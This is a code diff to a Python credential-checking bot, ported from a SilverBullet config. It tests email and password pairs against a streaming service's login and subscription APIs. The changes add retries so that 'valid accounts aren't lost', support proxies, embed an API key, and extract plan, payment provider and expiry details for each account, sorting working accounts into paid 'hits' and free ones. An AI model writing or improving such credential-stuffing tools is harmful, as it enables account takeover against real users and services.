@@ -15,6 +15,8 @@ from datetime import datetime
 from typing import Optional
 
 import requests
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
 
 from bot.utils.logger import setup_logger
 
@@ -25,6 +27,24 @@ _API_KEY = "857a1e5d-e35e-4fdf-805b-a87b6f8364bf"
 _APP_VAR = "6.58.0.a0c6b52"
 
 _BASE = "https://dce-frontoffice.imggaming.com"
+
+# Retry on transient HTTP errors so valid accounts aren't lost.
+_RETRY = Retry(
+    total=2,
+    backoff_factor=0.5,
+    status_forcelist=[429, 500, 502, 503, 504],
+    allowed_methods=["GET", "POST"],
+    raise_on_status=False,
+)
+
+
+def _make_session() -> requests.Session:
+    """Create a Session with automatic retries on transient errors."""
+    session = requests.Session()
+    adapter = HTTPAdapter(max_retries=_RETRY)
+    session.mount("https://", adapter)
+    session.mount("http://", adapter)
+    return session
 
 
 def _make_headers() -> dict[str, str]:
@@ -55,6 +75,43 @@ def _make_headers() -> dict[str, str]:
     }
 
 
+# ── Parsing helpers (match SB parse behaviour) ─────────────────────────
+
+def _find_json_value(obj: object, key: str) -> object:
+    """Recursively find the first scalar value for *key* in a JSON tree.
+
+    Matches SilverBullet's ``PARSE "<SOURCE>" JSON "key"`` which does a
+    depth-first recursive search and returns the first match.
+    """
+    if isinstance(obj, dict):
+        if key in obj and isinstance(obj[key], (str, int, float, bool)):
+            return obj[key]
+        for v in obj.values():
+            result = _find_json_value(v, key)
+            if result is not None:
+                return result
+    elif isinstance(obj, list):
+        for item in obj:
+            result = _find_json_value(item, key)
+            if result is not None:
+                return result
+    return None
+
+
+def _lr_parse(text: str, left: str, right: str) -> str:
+    """Extract substring between *left* and *right* markers.
+
+    Matches SilverBullet's ``PARSE "<SOURCE>" LR "left" "right"``
+    behaviour.  Returns empty string if either marker is not found.
+    """
+    try:
+        start = text.index(left) + len(left)
+        end = text.index(right, start)
+        return text[start:end]
+    except (ValueError, IndexError):
+        return ""
+
+
 # ── Synchronous check (mirrors SB config exactly) ──────────────────────
 
 def _check_sync(
@@ -70,7 +127,7 @@ def _check_sync(
     dict with ``free=True``   – for INACTIVE / no-subscription (free) accounts
     ``None``                  – for bad credentials / errors
     """
-    session = requests.Session()
+    session = _make_session()
     headers = _make_headers()
 
     try:
@@ -83,24 +140,30 @@ def _check_sync(
 
         # SB KEYCHECK: Success = "authorisationToken",
         #              Failure = "NOT_FOUND" | "failedAuthentication"
-        if "authorisationToken" not in r1.text:
-            if "failedAuthentication" in r1.text or "NOT_FOUND" in r1.text:
-                return None
-            if r1.status_code == 401:
+        r1_text = r1.text
+        if "authorisationToken" not in r1_text:
+            if ("failedAuthentication" in r1_text
+                    or "NOT_FOUND" in r1_text
+                    or r1.status_code == 401):
                 return None
             return None
 
-        token = r1.json()["authorisationToken"]
+        try:
+            token = r1.json()["authorisationToken"]
+        except (ValueError, KeyError):
+            return None
         headers["Authorization"] = f"Bearer {token}"
 
         # ── 2. ADDRESS → Country ────────────────────────────────────────
+        # SB: PARSE "<SOURCE>" JSON "countryCode"  (recursive search)
         country = ""
         try:
             r_addr = session.get(
                 f"{_BASE}/api/v2/user/address",
                 headers=headers, proxies=proxy, timeout=10,
             )
-            country = r_addr.json().get("countryCode", "")
+            addr_data = r_addr.json()
+            country = str(_find_json_value(addr_data, "countryCode") or "")
         except Exception:
             pass
 
@@ -110,10 +173,9 @@ def _check_sync(
             "?includeEntitlements=ALL_ACTIVE_USER_ENTITLEMENTS",
             headers=headers, proxies=proxy, timeout=10,
         )
-
         r2_text = r2.text
 
-        # -- Parse captures exactly as the SB config does --
+        # -- Parse captures matching SB config exactly --
         plan_name = ""
         plan_type = ""
         auto_renewal = ""
@@ -122,57 +184,86 @@ def _check_sync(
         expiry_date = "N/A"
         days_left = "0"
 
+        # ── JSON-parsed fields ──────────────────────────────────────────
+        # SB: PARSE "<SOURCE>" JSON "name"            → CAP "Plan"
+        # SB: PARSE "<SOURCE>" JSON "type"            → CAP "Plan Type"
+        # SB: PARSE "<SOURCE>" JSON "paymentEventType"→ CAP "Has Auto Renewal"
+        # These are recursive searches on the full response JSON.
+        data = None
         try:
             data = r2.json()
-            families = data.get("licenceFamilies", [])
-            if families:
-                fam = families[0]
-
-                # entitlements → Plan + Plan Type
-                ents = fam.get("entitlements", [])
-                if ents:
-                    ent = ents[0]
-                    plan_name = ent.get("name", "")
-                    plan_type = ent.get("type", "")
-
-                # paymentEventType → Has Auto Renewal
-                auto_renewal = fam.get("paymentEventType", "")
-
-                # paymentProviderInfo.type → Payment Provider
-                ppi = fam.get("paymentProviderInfo")
-                if isinstance(ppi, dict):
-                    payment_provider = ppi.get("type", "")
-
-                # status (SB uses LR between displayStyle … paymentProviderInfo)
-                account_status = fam.get("status", "")
-
-                # expiryTimestamp → Expiry Date + Days Left
-                expiry_ms = fam.get("expiryTimestamp", 0)
-                if expiry_ms:
-                    try:
-                        dt = datetime.fromtimestamp(expiry_ms / 1000)
-                        expiry_date = dt.strftime("%Y-%m-%d")
-                        days_left = str((dt - datetime.now()).days)
-                    except Exception:
-                        pass
+            plan_name = str(_find_json_value(data, "name") or "")
+            plan_type = str(_find_json_value(data, "type") or "")
+            auto_renewal = str(
+                _find_json_value(data, "paymentEventType") or ""
+            )
         except Exception:
             pass
 
-        # If JSON parsing didn't find the status, fall back to raw text
-        # extraction (matches the SB LR parse between displayStyle and
-        # paymentProviderInfo).
+        # ── LR-parsed fields ───────────────────────────────────────────
+        # SB: PARSE "<SOURCE>" LR '"paymentProviderInfo":{"type":"' '"'
+        payment_provider = _lr_parse(
+            r2_text,
+            '"paymentProviderInfo":{"type":"',
+            '"',
+        )
+
+        # Account Status – two-step LR, exactly as SB config:
+        # Step 1: PARSE "<SOURCE>" LR '"displayStyle":' '"paymentProviderInfo"'
+        chunk = _lr_parse(
+            r2_text, '"displayStyle":', '"paymentProviderInfo"'
+        )
+        # Step 2: PARSE "<1>" LR '"status":"' '",'
+        if chunk:
+            account_status = _lr_parse(chunk, '"status":"', '",')
+            if not account_status:
+                # Try without trailing comma (last field before })
+                account_status = _lr_parse(chunk, '"status":"', '"')
+
+        # Fallback: direct JSON for status
         if not account_status:
             try:
-                chunk = r2_text.split('"displayStyle":')[1]
-                chunk = chunk.split('"paymentProviderInfo"')[0]
-                account_status = chunk.split('"status":"')[1].split('"')[0]
+                if data is None:
+                    data = r2.json()
+                val = _find_json_value(data, "status")
+                if val and isinstance(val, str):
+                    account_status = val
+            except Exception:
+                pass
+
+        # Expiry timestamp
+        # SB: PARSE "<SOURCE>" LR '"expiryTimestamp":' ',"'
+        expiry_raw = _lr_parse(r2_text, '"expiryTimestamp":', ',"')
+        if not expiry_raw:
+            expiry_raw = _lr_parse(r2_text, '"expiryTimestamp":', ',')
+        if not expiry_raw:
+            # JSON fallback
+            try:
+                ts = _find_json_value(
+                    data if data else r2.json(), "expiryTimestamp"
+                )
+                if ts:
+                    expiry_raw = str(ts)
+            except Exception:
+                pass
+
+        if expiry_raw:
+            try:
+                expiry_ms = int(str(expiry_raw).strip())
+                if expiry_ms > 0:
+                    dt = datetime.fromtimestamp(expiry_ms / 1000)
+                    expiry_date = dt.strftime("%Y-%m-%d")
+                    days_left = str(max(0, (dt - datetime.now()).days))
             except Exception:
                 pass
 
         # ── SB KEYCHECK ─────────────────────────────────────────────────
-        # Success = Account Status contains "ACTIVE"
-        # Custom "FREE" = Account Status contains "INACTIVE"
-        if "ACTIVE" in account_status.upper():
+        # Success = Account Status is exactly "ACTIVE"
+        # Custom "FREE" = Account Status is "INACTIVE" or empty
+        # NOTE: SB uses "Contains ACTIVE" but "INACTIVE" also contains
+        # "ACTIVE" as a substring — we use exact match to correctly
+        # separate hits from free accounts.
+        if account_status.upper() == "ACTIVE":
             return {
                 "email": email,
                 "password": password,
